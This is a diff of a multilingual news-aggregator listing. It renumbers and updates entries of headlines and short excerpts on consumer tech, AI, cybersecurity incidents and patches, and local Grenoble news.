 **Source:** Wired | **Keyword:** `AI`
 With over a decade of experience in reviewing gaming laptops, here’s my rundown of what to consider before pulling the trigger.
 
@@ -2295,7 +2289,7 @@ With over a decade of experience in reviewing gaming laptops, here’s my rundow
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 111. `EN` [Ring Kills Flock Safety Deal After Super Bowl Ad Uproar](data/articles/04ee7ceb84f94b9ba6bff55252eb82d8.html)
+### 109. `EN` [Ring Kills Flock Safety Deal After Super Bowl Ad Uproar](data/articles/04ee7ceb84f94b9ba6bff55252eb82d8.html)
 **Source:** Wired | **Keyword:** `AI`
 Plus: Meta plans to add face recognition to its smart glasses, Jared Kushner named as part of whistleblower’s mysterious national security complaint, and more.
 
@@ -2303,7 +2297,7 @@ Plus: Meta plans to add face recognition to its smart glasses, Jared Kushner nam
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 112. `EN` [Best Alternatives to Google’s Android Operating System (2026), Tested and Reviewed](data/articles/47428894b4996125b48731eb142c85af.html)
+### 110. `EN` [Best Alternatives to Google’s Android Operating System (2026), Tested and Reviewed](data/articles/47428894b4996125b48731eb142c85af.html)
 **Source:** Wired | **Keyword:** `AI`
 Best Alternatives to Google’s Android Operating System (2026), Tested and Reviewed
 
@@ -2311,7 +2305,7 @@ Best Alternatives to Google’s Android Operating System (2026), Tested and Revi
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 113. `EN` [Here’s What It’s Like to Use H&amp;R Block’s DIY Tax Service (2026)](data/articles/67a8c45b88e73a13b9cd035b74612a1e.html)
+### 111. `EN` [Here’s What It’s Like to Use H&amp;R Block’s DIY Tax Service (2026)](data/articles/67a8c45b88e73a13b9cd035b74612a1e.html)
 **Source:** Wired | **Keyword:** `AI`
 Filing taxes is a pain. Here’s how H&amp;R Block DIY performed against other services I tested.
 
@@ -2319,7 +2313,7 @@ Filing taxes is a pain. Here’s how H&amp;R Block DIY performed against other s
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 114. `EN` [Gear News of the Week: Samsung Sets a Date for Galaxy Unpacked, and Fitbit’s AI Coach Comes to iOS](data/articles/c90c77386725ab2996603bb126a411a4.html)
+### 112. `EN` [Gear News of the Week: Samsung Sets a Date for Galaxy Unpacked, and Fitbit’s AI Coach Comes to iOS](data/articles/c90c77386725ab2996603bb126a411a4.html)
 **Source:** Wired | **Keyword:** `AI`
 Plus: iOS 26.3 makes it easy to switch to Android, Google cancels the Android 17 beta, and YouTube debuts on the Apple Vision Pro.
 
@@ -2327,7 +2321,7 @@ Plus: iOS 26.3 makes it easy to switch to Android, Google cancels the Android 17
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 115. `EN` [Lola Blankets Are 45 Percent Off This Presidents’ Day Weekend](data/articles/dc1bf5ef61fceabb4e18fb95d4d98fb8.html)
+### 113. `EN` [Lola Blankets Are 45 Percent Off This Presidents’ Day Weekend](data/articles/dc1bf5ef61fceabb4e18fb95d4d98fb8.html)
 **Source:** Wired | **Keyword:** `AI`
 From February 14 to 16, these ultra-plush blankets and throws are nearly half off. No exclusions.
 
@@ -2335,7 +2329,7 @@ From February 14 to 16, these ultra-plush blankets and throws are nearly half of
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 116. `EN` [Best Presidents’ Day Mattress Sales of 2026](data/articles/36666d2e99318aef00b36158065834c0.html)
+### 114. `EN` [Best Presidents’ Day Mattress Sales of 2026](data/articles/36666d2e99318aef00b36158065834c0.html)
 **Source:** Wired | **Keyword:** `AI`
 Some of the best sales of the year are happening right now—we’ll help you save on our all-time favorite mattresses and bedding.
 
@@ -2343,7 +2337,7 @@ Some of the best sales of the year are happening right now—we’ll help you sa
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 117. `EN` [Robot Dogs Are on Going on Patrol at the 2026 World Cup in Mexico](data/articles/3015ee8a36b17d84e00ed57a41e1b36f.html)
+### 115. `EN` [Robot Dogs Are on Going on Patrol at the 2026 World Cup in Mexico](data/articles/3015ee8a36b17d84e00ed57a41e1b36f.html)
 **Source:** Wired | **Keyword:** `AI`
 The Mexican city of Guadalupe, which will host portions of the 2026 World Cup, recently showed off four new robot dogs that will help provide security during matches at BBVA Stadium.
 
@@ -2351,7 +2345,7 @@ The Mexican city of Guadalupe, which will host portions of the 2026 World Cup, r
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 118. `EN` [Sony Promo Codes and Discounts: 45% Off](data/articles/6d025d8823a8df60d421887bb8d8e421.html)
+### 116. `EN` [Sony Promo Codes and Discounts: 45% Off](data/articles/6d025d8823a8df60d421887bb8d8e421.html)
 **Source:** Wired | **Keyword:** `AI`
 Upgrade your setup with Sony’s newest releases. Save on industry-leading noise-canceling audio, and pro-level Alpha cameras.
 
@@ -2359,7 +2353,7 @@ Upgrade your setup with Sony’s newest releases. Save on industry-leading noise
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 119. `EN` [OpenAI Is Nuking Its 4o Model. China’s ChatGPT Fans Aren’t OK](data/articles/0f245090a8b302ba54981f840e272700.html)
+### 117. `EN` [OpenAI Is Nuking Its 4o Model. China’s ChatGPT Fans Aren’t OK](data/articles/0f245090a8b302ba54981f840e272700.html)
 **Source:** Wired | **Keyword:** `AI`
 As OpenAI removed access to GPT-4o in its app on Friday, people who have come to rely on the chatbot for companionship are mourning the loss all over the world.
 
@@ -2367,9 +2361,25 @@ As OpenAI removed access to GPT-4o in its app on Friday, people who have come to
 
 <div class="article-item" data-lang="en" data-category="openclaw" data-source="Wired">
 
-### 120. `EN` [Social Security Workers Are Being Told to Hand Over Appointment Details to ICE](data/articles/25120d7c8dada9cf6d03b2f1085815c7.html)
+### 118. `EN` [Social Security Workers Are Being Told to Hand Over Appointment Details to ICE](data/articles/25120d7c8dada9cf6d03b2f1085815c7.html)
 **Source:** Wired | **Keyword:** `AI`
 The recent request goes against decades of precedent and puts noncitizens at further risk of immigration enforcement actions.
+
+</div>
+
+<div class="article-item" data-lang="en" data-category="openclaw" data-source="OpenAI Blog">
+
+### 119. `EN` [GPT-5.2 derives a new result in theoretical physics](data/articles/f01e7b0996ca2c650d506aa2396012ba.html)
+**Source:** OpenAI Blog | **Keyword:** `AI`
+A new preprint shows GPT-5.2 proposing a new formula for a gluon amplitude, later formally proved and verified by OpenAI and academic collaborators.
+
+</div>
+
+<div class="article-item" data-lang="en" data-category="openclaw" data-source="OpenAI Blog">
+
+### 120. `EN` [Introducing Lockdown Mode and Elevated Risk labels in ChatGPT](data/articles/4fafadd15590fd4d21c4434e2d5d6cea.html)
+**Source:** OpenAI Blog | **Keyword:** `AI`
+Introducing Lockdown Mode and Elevated Risk labels in ChatGPT to help organizations defend against prompt injection and AI-driven data exfiltration.
 
 </div>
 
@@ -2533,15 +2543,23 @@ BYOVD refers to an adversarial technique that abuses legitimate but flawed drive
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="PortSwigger Research">
 
-### 18. `EN` [Top 10 web hacking techniques of 2025: call for nominations](data/articles/b7ac0ae368f50f7a5248a4d01f20a1c5.html)
+### 18. `EN` [Top 10 web hacking techniques of 2025](data/articles/172a06e844f385e57a2c5a241c5eb23d.html)
 **Source:** PortSwigger Research | **Keyword:** `Security`
-Update: nominations are now closed, and voting is live! Cast your vote here Over the last year, security researchers have shared a huge amount of work with the community through blog posts, presentati
+Welcome to the Top 10 Web Hacking Techniques of 2025, the 19th edition of our annual community-powered effort to identify the most innovative must-read web security research published in the last year
+
+</div>
+
+<div class="article-item" data-lang="en" data-category="cybersecurity" data-source="PortSwigger Research">
+
+### 19. `EN` [Top 10 web hacking techniques of 2024: nominations open](data/articles/69cf566a33c63330c6c9cf2e5ab3e225.html)
+**Source:** PortSwigger Research | **Keyword:** `Security`
+Nominations are now open for the top 10 new web hacking techniques of 2024! Every year, security researchers from all over the world share their latest findings via blog posts, presentations, PoCs, an
 
 </div>
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="SecurityWeek">
 
-### 19. `EN` [New Keenadu Android Malware Found on Thousands of Devices](data/articles/d70b17efa24a2848e2f03387233fe5bb.html)
+### 20. `EN` [New Keenadu Android Malware Found on Thousands of Devices](data/articles/d70b17efa24a2848e2f03387233fe5bb.html)
 **Source:** SecurityWeek | **Keyword:** `Security`
 The malware has been preinstalled on many devices but it has also been distributed through Google Play and other app stores.
 
@@ -2549,7 +2567,7 @@ The malware has been preinstalled on many devices but it has also been distribut
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="SecurityWeek">
 
-### 20. `EN` [CISA: Hackers Exploiting Vulnerability in Product of Taiwan Security Firm TeamT5](data/articles/a2d70227fc9073fa2700758c0c4d3c77.html)
+### 21. `EN` [CISA: Hackers Exploiting Vulnerability in Product of Taiwan Security Firm TeamT5](data/articles/a2d70227fc9073fa2700758c0c4d3c77.html)
 **Source:** SecurityWeek | **Keyword:** `Security`
 The vulnerability added to CISA’s KEV catalog affects ThreatSonar Anti-Ransomware and it was patched in 2024.
 
@@ -2557,7 +2575,7 @@ The vulnerability added to CISA’s KEV catalog affects ThreatSonar Anti-Ransomw
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="The Hacker News">
 
-### 21. `EN` [Notepad++ Fixes Hijacked Update Mechanism Used to Deliver Targeted Malware](data/articles/4af5852bc769d8b7a8c4f11071d0b5e1.html)
+### 22. `EN` [Notepad++ Fixes Hijacked Update Mechanism Used to Deliver Targeted Malware](data/articles/4af5852bc769d8b7a8c4f11071d0b5e1.html)
 **Source:** The Hacker News | **Keyword:** `Security`
 Notepad++ has released a security fix to plug gaps that were exploited by an advanced threat actor from China to hijack the software update mechanism to selectively deliver malware to targets of interest.
 The version 8.9.2 update incorporates what maintainer Don Ho calls a "double lock" design that aims to make the update process "robust and effectively unexploitable." This includes verification
@@ -2566,7 +2584,7 @@ The version 8.9.2 update incorporates what maintainer Don Ho calls a "double loc
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="Bleeping Computer">
 
-### 22. `EN` [Chinese hackers exploiting Dell zero-day flaw since mid-2024](data/articles/a42a20dc86fdd669667441e10df05b05.html)
+### 23. `EN` [Chinese hackers exploiting Dell zero-day flaw since mid-2024](data/articles/a42a20dc86fdd669667441e10df05b05.html)
 **Source:** Bleeping Computer | **Keyword:** `Security`
 A suspected Chinese state-backed hacking group has been quietly exploiting a critical Dell security flaw in zero-day attacks that started in mid-2024. [...]
 
@@ -2574,7 +2592,7 @@ A suspected Chinese state-backed hacking group has been quietly exploiting a cri
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="The Hacker News">
 
-### 23. `EN` [Keenadu Firmware Backdoor Infects Android Tablets via Signed OTA Updates](data/articles/477cc46d5d2dc3b8fc0e503462db2c6e.html)
+### 24. `EN` [Keenadu Firmware Backdoor Infects Android Tablets via Signed OTA Updates](data/articles/477cc46d5d2dc3b8fc0e503462db2c6e.html)
 **Source:** The Hacker News | **Keyword:** `Security`
 A new Android backdoor that's embedded deep into the device firmware can silently harvest data and remotely control its behavior, according to new findings from Kaspersky.
 The Russian cybersecurity vendor said it discovered the backdoor, dubbed Keenadu, in the firmware of devices associated with various brands, including Alldocube, with the compromise occurring during the firmware build phase.
@@ -2583,7 +2601,7 @@ The Russian cybersecurity vendor said it discovered the backdoor, dubbed Keenadu
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="The Hacker News">
 
-### 24. `EN` [Microsoft Finds “Summarize with AI” Prompts Manipulating Chatbot Recommendations](data/articles/64fd9da108bdba601ca13d4d5b0c4feb.html)
+### 25. `EN` [Microsoft Finds “Summarize with AI” Prompts Manipulating Chatbot Recommendations](data/articles/64fd9da108bdba601ca13d4d5b0c4feb.html)
 **Source:** The Hacker News | **Keyword:** `Security`
 New research from Microsoft has revealed that legitimate businesses are gaming artificial intelligence (AI) chatbots via the "Summarize with AI" button that's being increasingly placed on websites in ways that mirror classic search engine poisoning (SEO).
 The new AI hijacking technique has been codenamed AI Recommendation Poisoning by the Microsoft Defender Security Research Team. The tech giant
@@ -2592,7 +2610,7 @@ The new AI hijacking technique has been codenamed AI Recommendation Poisoning by
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="The Hacker News">
 
-### 25. `EN` [Weekly Recap: Outlook Add-Ins Hijack, 0-Day Patches, Wormable Botnet &amp; AI Malware](data/articles/d232a74b28a692b037cdcaefedc252af.html)
+### 26. `EN` [Weekly Recap: Outlook Add-Ins Hijack, 0-Day Patches, Wormable Botnet &amp; AI Malware](data/articles/d232a74b28a692b037cdcaefedc252af.html)
 **Source:** The Hacker News | **Keyword:** `Security`
 This week’s recap shows how small gaps are turning into big entry points. Not always through new exploits, often through tools, add-ons, cloud setups, or workflows that people already trust and rarely question.
 Another signal: attackers are mixing old and new methods. Legacy botnet tactics, modern cloud abuse, AI assistance, and supply-chain exposure are being used side by side, whichever path
@@ -2601,7 +2619,7 @@ Another signal: attackers are mixing old and new methods. Legacy botnet tactics,
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="The Hacker News">
 
-### 26. `EN` [New Chrome Zero-Day (CVE-2026-2441) Under Active Attack — Patch Released](data/articles/9be2c3418f4d95c100812b5911ea584a.html)
+### 27. `EN` [New Chrome Zero-Day (CVE-2026-2441) Under Active Attack — Patch Released](data/articles/9be2c3418f4d95c100812b5911ea584a.html)
 **Source:** The Hacker News | **Keyword:** `Security`
 Google on Friday released security updates for its Chrome browser to address a security flaw that it said has been exploited in the wild.
 The high-severity vulnerability, tracked as CVE-2026-2441 (CVSS score: 8.8), has been described as a use-after-free bug in CSS. Security researcher Shaheen Fazim has been credited with discovering and reporting the shortcoming on February 11, 2026.
@@ -2611,7 +2629,7 @@ The high-severity vulnerability, tracked as CVE-2026-2441 (CVSS score: 8.8), has
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="The Hacker News">
 
-### 27. `EN` [Google Ties Suspected Russian Actor to CANFAIL Malware Attacks on Ukrainian Orgs](data/articles/2df9761fb46f7cb418459862c3cc496b.html)
+### 28. `EN` [Google Ties Suspected Russian Actor to CANFAIL Malware Attacks on Ukrainian Orgs](data/articles/2df9761fb46f7cb418459862c3cc496b.html)
 **Source:** The Hacker News | **Keyword:** `Security`
 A previously undocumented threat actor has been attributed to attacks targeting Ukrainian organizations with malware known as CANFAIL.
 Google Threat Intelligence Group (GTIG) described the hacking group as possibly affiliated with Russian intelligence services. The threat actor is assessed to have targeted defense, military, government, and energy organizations within the Ukrainian regional and
@@ -2620,7 +2638,7 @@ Google Threat Intelligence Group (GTIG) described the hacking group as possibly 
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="The Hacker News">
 
-### 28. `EN` [UAT-9921 Deploys VoidLink Malware to Target Technology and Financial Sectors](data/articles/866c073b3814bec8ad81638404b0b17a.html)
+### 29. `EN` [UAT-9921 Deploys VoidLink Malware to Target Technology and Financial Sectors](data/articles/866c073b3814bec8ad81638404b0b17a.html)
 **Source:** The Hacker News | **Keyword:** `Security`
 A previously unknown threat actor tracked as UAT-9921 has been observed leveraging a new modular framework called VoidLink in its campaigns targeting the technology and financial services sectors, according to findings from Cisco Talos.
 "This threat actor seems to have been active since 2019, although they have not necessarily used VoidLink over the duration of their activity," researchers Nick
@@ -2629,7 +2647,7 @@ A previously unknown threat actor tracked as UAT-9921 has been observed leveragi
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="The Hacker News">
 
-### 29. `EN` [Researchers Observe In-the-Wild Exploitation of BeyondTrust CVSS 9.9 Vulnerability](data/articles/7f2083c64d2c70612354de0427ce0ffe.html)
+### 30. `EN` [Researchers Observe In-the-Wild Exploitation of BeyondTrust CVSS 9.9 Vulnerability](data/articles/7f2083c64d2c70612354de0427ce0ffe.html)
 **Source:** The Hacker News | **Keyword:** `Security`
 Threat actors have started to exploit a recently disclosed critical security flaw impacting BeyondTrust Remote Support (RS) and Privileged Remote Access (PRA) products, according to watchTowr.
 "Overnight we observed first in-the-wild exploitation of BeyondTrust across our global sensors," Ryan Dewhurst, head of threat intelligence at watchTowr, said in a post on X. "Attackers are abusing
@@ -2638,7 +2656,7 @@ Threat actors have started to exploit a recently disclosed critical security fla
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="The Hacker News">
 
-### 30. `EN` [ThreatsDay Bulletin: AI Prompt RCE, Claude 0-Click, RenEngine Loader, Auto 0-Days &amp; 25+ Stories](data/articles/13b3ae2f55df3975ccc9c7a43cfa0b62.html)
+### 31. `EN` [ThreatsDay Bulletin: AI Prompt RCE, Claude 0-Click, RenEngine Loader, Auto 0-Days &amp; 25+ Stories](data/articles/13b3ae2f55df3975ccc9c7a43cfa0b62.html)
 **Source:** The Hacker News | **Keyword:** `Security`
 Threat activity this week shows one consistent signal — attackers are leaning harder on what already works. Instead of flashy new exploits, many operations are built around quiet misuse of trusted tools, familiar workflows, and overlooked exposures that sit in plain sight.
 Another shift is how access is gained versus how it’s used. Initial entry points are getting simpler, while post-compromise
@@ -2647,7 +2665,7 @@ Another shift is how access is gained versus how it’s used. Initial entry poin
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="The Hacker News">
 
-### 31. `EN` [83% of Ivanti EPMM Exploits Linked to Single IP on Bulletproof Hosting Infrastructure](data/articles/714153f4e1e57e07859c88f2583d5dc0.html)
+### 32. `EN` [83% of Ivanti EPMM Exploits Linked to Single IP on Bulletproof Hosting Infrastructure](data/articles/714153f4e1e57e07859c88f2583d5dc0.html)
 **Source:** The Hacker News | **Keyword:** `Security`
 A significant chunk of the exploitation attempts targeting a newly disclosed security flaw in Ivanti Endpoint Manager Mobile (EPMM) can be traced back to a single IP address on bulletproof hosting infrastructure offered by PROSPERO.
 Threat intelligence firm GreyNoise said it recorded 417 exploitation sessions from 8 unique source IP addresses between February 1 and 9, 2026. An estimated 346
@@ -2656,7 +2674,7 @@ Threat intelligence firm GreyNoise said it recorded 417 exploitation sessions fr
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="The Hacker News">
 
-### 32. `EN` [Over 60 Software Vendors Issue Security Fixes Across OS, Cloud, and Network Platforms](data/articles/8ba1d274b3059368695008351ac90677.html)
+### 33. `EN` [Over 60 Software Vendors Issue Security Fixes Across OS, Cloud, and Network Platforms](data/articles/8ba1d274b3059368695008351ac90677.html)
 **Source:** The Hacker News | **Keyword:** `Security`
 It's Patch Tuesday, which means a number of software vendors have released patches for various security vulnerabilities impacting their products and services.
 Microsoft issued fixes for 59 flaws, including six actively exploited zero-days in various Windows components that could be abused to bypass security features, escalate privileges, and trigger a denial-of-service (DoS) condition.
@@ -2666,16 +2684,24 @@ Elsewhere
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="The Hacker News">
 
-### 33. `EN` [Microsoft Patches 59 Vulnerabilities Including Six Actively Exploited Zero-Days](data/articles/87fa7ea7e3535a54e4f98efa4eb8bee3.html)
+### 34. `EN` [Microsoft Patches 59 Vulnerabilities Including Six Actively Exploited Zero-Days](data/articles/87fa7ea7e3535a54e4f98efa4eb8bee3.html)
 **Source:** The Hacker News | **Keyword:** `Security`
 Microsoft on Tuesday released security updates to address a set of 59 flaws across its software, including six vulnerabilities that it said have been exploited in the wild.
 Of the 59 flaws, five are rated Critical, 52 are rated Important, and two are rated Moderate in severity. Twenty-five of the patched vulnerabilities have been classified as privilege escalation, followed by remote code
 
 </div>
 
+<div class="article-item" data-lang="en" data-category="cybersecurity" data-source="Krebs on Security">
+
+### 35. `EN` [Patch Tuesday, February 2026 Edition](data/articles/d39cb96c8d24a487942391ee9863e958.html)
+**Source:** Krebs on Security | **Keyword:** `Security`
+Microsoft today released updates to fix more than 50 security holes in its Windows operating systems and other software, including patches for a whopping six "zero-day" vulnerabilities that attackers are already exploiting in the wild.
+
+</div>
+
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="The Hacker News">
 
-### 34. `EN` [SolarWinds Web Help Desk Exploited for RCE in Multi-Stage Attacks on Exposed Servers](data/articles/bf975c96f2901117560151f04b24f5f9.html)
+### 36. `EN` [SolarWinds Web Help Desk Exploited for RCE in Multi-Stage Attacks on Exposed Servers](data/articles/bf975c96f2901117560151f04b24f5f9.html)
 **Source:** The Hacker News | **Keyword:** `Security`
 Microsoft has revealed that it observed a multi‑stage intrusion that involved the threat actors exploiting internet‑exposed SolarWinds Web Help Desk (WHD) instances to obtain initial access and move laterally across the organization's network to other high-value assets.
 That said, the Microsoft Defender Security Research Team said it's not clear whether the activity weaponized recently
@@ -2684,7 +2710,7 @@ That said, the Microsoft Defender Security Research Team said it's not clear whe
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="Krebs on Security">
 
-### 35. `EN` [Kimwolf Botnet Lurking in Corporate, Govt. Networks](data/articles/47049a7169772dd6a23256ccf18b9e70.html)
+### 37. `EN` [Kimwolf Botnet Lurking in Corporate, Govt. Networks](data/articles/47049a7169772dd6a23256ccf18b9e70.html)
 **Source:** Krebs on Security | **Keyword:** `Security`
 A new Internet-of-Things botnet called Kimwolf has spread to more than 2 million devices, forcing infected systems to participate in massive distributed denial-of-service (DDoS) attacks and to relay other malicious and abusive Internet traffic. Kimwolf's ability to scan the local networks of compromised systems for other IoT devices to infect makes it a sobering threat to organizations, and new research reveals Kimwolf is surprisingly prevalent in government and corporate networks.
 
@@ -2692,15 +2718,7 @@ A new Internet-of-Things botnet called Kimwolf has spread to more than 2 million
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="Krebs on Security">
 
-### 36. `EN` [Patch Tuesday, January 2026 Edition](data/articles/fd2d24ecbc14da1149cb2ee622f928ac.html)
-**Source:** Krebs on Security | **Keyword:** `Security`
-Microsoft today issued patches to plug at least 113 security holes in its various Windows operating systems and supported software. Eight of the vulnerabilities earned Microsoft's most-dire "critical" rating, and the company warns that attackers are already exploiting one of the bugs fixed today.
-
-</div>
-
-<div class="article-item" data-lang="en" data-category="cybersecurity" data-source="Krebs on Security">
-
-### 37. `EN` [Who Benefited from the Aisuru and Kimwolf Botnets?](data/articles/598dddf8979263e19f2d2ab62b0729d8.html)
+### 38. `EN` [Who Benefited from the Aisuru and Kimwolf Botnets?](data/articles/598dddf8979263e19f2d2ab62b0729d8.html)
 **Source:** Krebs on Security | **Keyword:** `Security`
 Our first story of 2026 revealed how a destructive new botnet called Kimwolf rapidly grew to infect more than two million devices by mass-compromising a vast number of unofficial Android TV streaming boxes. Today, we'll dig through digital clues left behind by the hackers, network operators, and cybercrime services that appear to have benefitted from Kimwolf's spread.
 
@@ -2708,17 +2726,9 @@ Our first story of 2026 revealed how a destructive new botnet called Kimwolf rap
 
 <div class="article-item" data-lang="en" data-category="cybersecurity" data-source="Krebs on Security">
 
-### 38. `EN` [Happy 16th Birthday, KrebsOnSecurity.com!](data/articles/9b5b343e667526a31963ee7ed03f89f1.html)
+### 39. `EN` [Happy 16th Birthday, KrebsOnSecurity.com!](data/articles/9b5b343e667526a31963ee7ed03f89f1.html)
 **Source:** Krebs on Security | **Keyword:** `Security`
 KrebsOnSecurity.com celebrates its 16th anniversary today! A huge "thank you" to all of our readers -- newcomers, long-timers and drive-by critics alike. Your engagement this past year here has been tremendous and truly a salve on a handful of dark days. Happily, comeuppance was a strong theme running through our coverage in 2025, with a primary focus on entities that enabled complex and globally-dispersed cybercrime services.
-
-</div>
-
-<div class="article-item" data-lang="en" data-category="cybersecurity" data-source="Krebs on Security">
-
-### 39. `EN` [Most Parked Domains Now Serving Malicious Content](data/articles/add905ee84c780931a0d364ed4f352e4.html)
-**Source:** Krebs on Security | **Keyword:** `Security`
-Direct navigation -- the act of visiting a website by manually typing a domain name in a web browser -- has never been riskier: A new study finds the vast majority of "parked" domains -- mostly expired or dormant domain names, or common misspellings of popular websites -- are now configured to redirect visitors to sites that foist scams and malware.
 
 </div>
 
@@ -2852,15 +2862,7 @@ Un homme a été agressé à l’arrêt de tramway Vallier/Libération à Grenob
 
 <div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Isère">
 
-### 8. `FR` [Grenoble. Début d’incendie dans un appartement du centre-ville](data/articles/1f2907fcdd2959b499b16868f1ee35fb.html)
-**Source:** Le Dauphiné Isère | **Keyword:** `Local`
-Un incendie vraisemblablement d’origine électrique s’est déclaré peu avant 7 heures ce mercredi 18 février dans un appartement situé au 1 rue des Clercs dans le centre-ville de Grenoble.
-
-</div>
-
-<div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Isère">
-
-### 9. `FR` [Grenoble. « On se sent abandonnés » : après un incendie dans leur immeuble, la colère des habitants face au silence de leur bailleur](data/articles/43a3fc252c8d21053ad6d77aa167d341.html)
+### 8. `FR` [Grenoble. « On se sent abandonnés » : après un incendie dans leur immeuble, la colère des habitants face au silence de leur bailleur](data/articles/43a3fc252c8d21053ad6d77aa167d341.html)
 **Source:** Le Dauphiné Isère | **Keyword:** `Local`
 Le sentiment d’incompréhension ne cesse de croître chez les résidents de cet immeuble, avenue des Jeux olympiques, à Grenoble. Depuis l’incendie survenu en octobre dernier dans les parties communes, ils dénoncent un manque de communication et de suivi de la part de leur bailleur social.
 
@@ -2868,7 +2870,7 @@ Le sentiment d’incompréhension ne cesse de croître chez les résidents de ce
 
 <div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Une">
 
-### 10. `FR` [Météo. Massifs des Alpes du Sud : un enneigement digne des « grands hivers »](data/articles/c18fce912216f0725539bef8c15f3be8.html)
+### 9. `FR` [Météo. Massifs des Alpes du Sud : un enneigement digne des « grands hivers »](data/articles/c18fce912216f0725539bef8c15f3be8.html)
 **Source:** Le Dauphiné Une | **Keyword:** `Local`
 Les massifs des Alpes du Sud connaissent un niveau d’enneigement qui n’avait pas été observé depuis près d’une décennie. Après un début d’hiver contrasté, les importantes chutes de neige des dernières semaines ont changé la donne. Une situation qui implique toutefois un risque avalanche accru.
 
@@ -2876,7 +2878,7 @@ Les massifs des Alpes du Sud connaissent un niveau d’enneigement qui n’avait
 
 <div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Isère Sud">
 
-### 11. `FR` [Catastrophe. Le Teil, Vercors, Annecy... Les séismes les plus puissants dans nos départements](data/articles/cd9a5eb7145c5c207b65e1fbf22493c0.html)
+### 10. `FR` [Catastrophe. Le Teil, Vercors, Annecy... Les séismes les plus puissants dans nos départements](data/articles/cd9a5eb7145c5c207b65e1fbf22493c0.html)
 **Source:** Le Dauphiné Isère Sud | **Keyword:** `Local`
 Les séismes de magnitude égale ou supérieure à 5 sur l’échelle de Richter sont inhabituels en France. Dans le grand Sud-Est, ce seuil n’a été dépassé que cinq fois au cours des 60 dernières années : en Ardèche, en Isère, dans les Alpes-de-Haute-Provence et les Hautes-Alpes, ainsi qu’en Haute-Savoie. Voici les tremblements de terre les plus puissants enregistrés dans nos départements.
 
@@ -2884,7 +2886,7 @@ Les séismes de magnitude égale ou supérieure à 5 sur l’échelle de Richter
 
 <div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Isère Sud">
 
-### 12. `FR` [En images - Rugby. Quand le FCG affrontait Valence et Romans avant le VRDR](data/articles/8234b6fdebe21fa6d42b29f716b2cb7c.html)
+### 11. `FR` [En images - Rugby. Quand le FCG affrontait Valence et Romans avant le VRDR](data/articles/8234b6fdebe21fa6d42b29f716b2cb7c.html)
 **Source:** Le Dauphiné Isère Sud | **Keyword:** `Local`
 Le FC Grenoble Rugby reçoit ce vendredi 10 novembre à 21 h, pour la compte de la 10e journée de Pro D2, son "voisin" de Valence Romans Drôme Rugby. Il ne s'agit que de la quatrième confrontation entre ces deux équipes, le VRDR ayant vu le jour en 2016. En revanche, les matches depuis les années 50 jusqu'aux années 90 n'ont pas manqué entre les Isérois et les Drômois de Valence et de Romans. Retour en images sur ces "derbys" d'antan et de maintenant.
 
@@ -2892,7 +2894,7 @@ Le FC Grenoble Rugby reçoit ce vendredi 10 novembre à 21 h, pour la compte de 
 
 <div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Isère Sud">
 
-### 13. `FR` [En images . Il y a sept ans, dans nos villes, l'hommage aux victimes des attentats de Paris](data/articles/457741786cc6e2c99cda7597743275e4.html)
+### 12. `FR` [En images . Il y a sept ans, dans nos villes, l'hommage aux victimes des attentats de Paris](data/articles/457741786cc6e2c99cda7597743275e4.html)
 **Source:** Le Dauphiné Isère Sud | **Keyword:** `Local`
 Le soir du 13 novembre 2015, neuf hommes ont mené une série d’attaques aux abords du Stade de France à Saint-Denis, de terrasses de restaurants et dans la salle de concerts du Bataclan à Paris, faisant 130 morts et plus de 350 blessés. Après l'horreur, dans les jours qui ont suivi, des rassemblements avaient été organisés à Grenoble, Valence ou encore Annecy. Dans d'autres villes, on a pleuré la perte de proches tués lors de ces attentats comme à Gap, Jarrie ou Gilly-sur-Isère. Retour en images sur ces moments de recueillement.
 
@@ -2900,7 +2902,7 @@ Le soir du 13 novembre 2015, neuf hommes ont mené une série d’attaques aux a
 
 <div class="article-item" data-lang="fr" data-category="local" data-source="Le Dauphiné Isère Sud">
 
-### 14. `FR` [En images. Alain Carignon qui fait du toboggan... : la Foire des Rameaux ressemblait à ça dans les années 80](data/articles/4e11121d9a95cc51d143cf69df2c2cfb.html)
+### 13. `FR` [En images. Alain Carignon qui fait du toboggan... : la Foire des Rameaux ressemblait à ça dans les années 80](data/articles/4e11121d9a95cc51d143cf69df2c2cfb.html)
 **Source:** Le Dauphiné Isère Sud | **Keyword:** `Local`
